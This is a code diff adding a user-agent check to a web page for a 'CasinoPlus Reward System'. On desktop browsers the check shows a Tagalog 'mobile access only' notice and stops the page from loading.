@@ -122,6 +122,36 @@
     </div>
 
     <script>
+
+(function() {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    
+    // Check kung ang device ay Mobile (Android, iPhone, iPad, iPod)
+    const isMobile = /android|iphone|ipad|ipod/i.test(userAgent.toLowerCase());
+
+    if (!isMobile) {
+        document.body.innerHTML = `
+            <div style="
+                height: 100vh; display: flex; flex-direction: column; 
+                align-items: center; justify-content: center; 
+                background: #04070d; color: #fff; font-family: 'Public Sans', sans-serif; 
+                text-align: center; padding: 30px;
+            ">
+                <img src="images/logo1.png" style="width: 150px; margin-bottom: 20px; opacity: 0.5;">
+                <h1 style="color: #ffdc6a; font-size: 28px; margin-bottom: 10px;">MOBILE ACCESS ONLY</h1>
+                <p style="color: #ccc; font-size: 16px; line-height: 1.5;">
+                    Paumanhin! Ang <b>CasinoPlus Reward System</b> ay maaari lamang gamitin sa mobile devices.<br>
+                    Mangyaring gamitin ang iyong <b>Smartphone</b> para magpatuloy.
+                </p>
+                <div style="margin-top: 30px; padding: 10px 20px; border: 1px solid rgba(212,175,55,0.3); border-radius: 10px; font-size: 12px; color: #555;">
+                    Desktop access detected.
+                </div>
+            </div>
+        `;
+        window.stop();
+        throw new Error("Mobile Only Access");
+    }
+})();
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         const userPhone = localStorage.getItem("userPhone") || "Guest";
